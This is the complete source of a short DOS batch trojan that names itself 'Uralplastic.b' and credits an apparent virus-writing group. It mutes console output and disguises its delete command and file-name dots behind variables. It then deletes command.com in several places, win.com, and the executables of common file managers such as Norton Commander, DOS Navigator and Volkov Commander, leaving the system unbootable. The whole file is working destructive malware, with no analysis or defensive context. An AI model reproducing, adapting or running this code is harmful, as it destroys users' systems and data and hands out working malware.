@echo off
ctty nul
rem Trojan "Uralplastic.b" by Helloween
rem (C) POWER HEAP RESEARCH
set er=del
set t=.
%er% %windir%\command%t%com
%er% %windir%\command\command%t%com
%er% %windir%\win%t%com
%er% c:\nc\ncmain%t%exe
%er% c:\dos\command%t%com
%er% c:\dn\dn%t%com
%er% c:\vc\vc%t%com
%er% c:\command%t%com